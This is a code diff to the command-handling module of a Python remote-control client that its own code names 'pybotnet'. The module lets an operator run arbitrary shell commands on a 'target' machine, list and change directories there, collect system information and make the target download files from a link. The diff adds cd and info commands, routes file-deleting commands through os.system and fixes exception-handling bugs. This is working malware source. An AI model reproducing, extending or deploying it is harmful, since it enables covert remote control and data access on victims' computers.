@@ -23,9 +23,13 @@ scripts_name = {
 
     "get_info": "`get_info`: get target info",
 
+    "info": "`info`: run `get_info` command!",
+
     "cmd": "`cmd <command>`: run command in target terminal",
 
     "ls": "`ls <route>`: Return a list of folders and files in that path",
+
+    "cd": "`cd <route>`: change directory",
 
     "export_file": "`export_file <download link>`: target donwload this file and save to script path",
 
@@ -70,7 +74,7 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
             elif command_name == 'do_sleep':
                 return execute_do_sleep(command, logger)
 
-            elif command_name == 'get_info':
+            elif command_name in ['get_info', 'info']:
                 return get_info(pybotnet_up_time, logger)
 
             elif command_name == 'cmd':
@@ -78,6 +82,9 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
+
+            elif command_name == 'cd':
+                return execute_cd(command, logger)
 
             elif command_name == 'export_file':
                 return execute_download_manager(command, logger)
@@ -94,7 +101,7 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
-    except exception as error:
+    except Exception as error:
         return f'execute_scripts error: {error}'
 
 
@@ -114,7 +121,7 @@ def execute_do_sleep(command, logger):
     except OverflowError as error_name:
         logger.error(f'do_sleep {error_name}')
 
-    except exception as error:
+    except Exception as error:
         logger.error(
             f'execute_do_sleep invalid command; Wrong format, error: {error}')
         return f'execute_do_sleep invalid command; Wrong format, error: {error}'
@@ -137,21 +144,54 @@ def get_info(pybotnet_up_time, logger):
     return util.get_full_system_info(pybotnet_up_time)
 
 
-def execute_cmd(command, is_shell: bool, logger) -> str:
+def ls(route: str) -> str:
     try:
-        command = split_command(command)
-        command = command[1:]
+        return "\n".join(os.listdir(route))
 
-    except exception as error:
-        return f'execute_cmd invalid command; Wrong format: {error}'
+    except FileNotFoundError as error:
+        return f'ls {error}'
+    except Exception as error:
+        return f'ls Unknown error: {error}'
+
+
+def execute_ls(command, logger) -> str:
+    command = split_command(command)
+
+    logger.info(f'execute ls: {command}')
 
     try:
-        return cmd(command, is_shell, logger=logger)
+        if len(command) >= 2:
+            path = command[1]
+        else:
+            path = '.'
+        return ls(path)
+    except Exception as error:
+        return f'execute_ls error: {error} '
 
-    except OverflowError as error:
-        return f'cmd {error}'
-    except exception as error:
-        return f'cmd error: {error}'
+
+def cd(path: str) -> str:
+    try:
+        os.chdir(path)
+        return f'move to: {os.getcwd()}'
+
+    except FileNotFoundError as error:
+        return f'cd {error}'
+    except Exception as error:
+        return f'cd Unknown error: {error}'
+
+
+def execute_cd(command, logger) -> str:
+    command = split_command(command)
+
+    logger.info(f'execute cd: {command}')
+    try:
+        if len(command) >= 2:
+            path = command[1]
+        else:
+            path = ' '
+        return cd(path)
+    except Exception as error:
+        return f'execute_ls error: {error} '
 
 
 def clean_shell_data(output):
@@ -162,16 +202,27 @@ def clean_shell_data(output):
 
 
 def cmd(command: list, is_shell: bool, logger):
-    '''if you compile app on noconsloe mod make is_shell False'''
+    '''run code on terminal'''
+
+    if command[0] == 'ls':
+        logger.info('redirect to execute_ls')
+        return execute_ls(" ".join(command), logger)
+
+    elif command[0] == 'cd':
+        logger.info('redirect to execute_cd')
+        return execute_cd(" ".join(command), logger)
 
     logger.info(f'try to run: {command}')
 
-    if not is_shell:
-
-        # if compile code on noconsole i can get stdout:
+    if not is_shell or command[0] in ['mkdir', 'touch', 'rm', 'rmdir']:
         os_result = os.system(' '.join(command))
-        return f'''output code {os_result} \n\nyou compile app noconsole (is_shell = False), That\'s why I can\'t get the output text by `cmd` command
-        (for get directory list use `ls` command, like : `ls /home`)'''
+        add_on_message = ''
+        if not is_shell:
+            add_on_message = '''\n
+you compile app noconsole (is_shell = False)
+That\'s why I can\'t get the output text by `cmd` command'''
+
+        return f'output code "{os_result}", {add_on_message}'
 
     else:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
@@ -182,29 +233,22 @@ def cmd(command: list, is_shell: bool, logger):
         return clean_shell_data(result)
 
 
-def execute_ls(command, logger) -> str:
-    command = split_command(command)
+def execute_cmd(command, is_shell: bool, logger) -> str:
+    try:
+        command = split_command(command)
+        if command[0] == 'cmd':
+            command = command[1:]
 
-    logger.info(f'execute ls: {command}')
+    except Exception as error:
+        return f'execute_cmd invalid command; Wrong format: {error}'
 
     try:
-        if len(command) >= 2:
-            route = command[1]
-        else:
-            route = '.'
-        return ls(route)
-    except exception as error:
-        return f'execute_ls error: {error} '
+        return cmd(command, is_shell, logger=logger)
 
-
-def ls(route: str) -> str:
-    try:
-        return os.listdir(route)
-
-    except FileNotFoundError as error:
-        return f'ls {error}'
-    except exception as error:
-        return f'ls Unknown error: {error}'
+    except OverflowError as error:
+        return f'cmd {error}'
+    except Exception as error:
+        return f'cmd error: {error}'
 
 
 def execute_download_manager(command: str, logger):
@@ -229,7 +273,7 @@ def execute_download_manager(command: str, logger):
             f'execute_download_manager wrong format ;need download link for execute_download_manager; error:{error}')
         return f'i need download link for execute_download_manager; error:{error}'
 
-    except exception as error:
+    except Exception as error:
         logger.info(
             f'execute_download_manager; error:{error}')
         return f'execute_download_manager error:{error}'
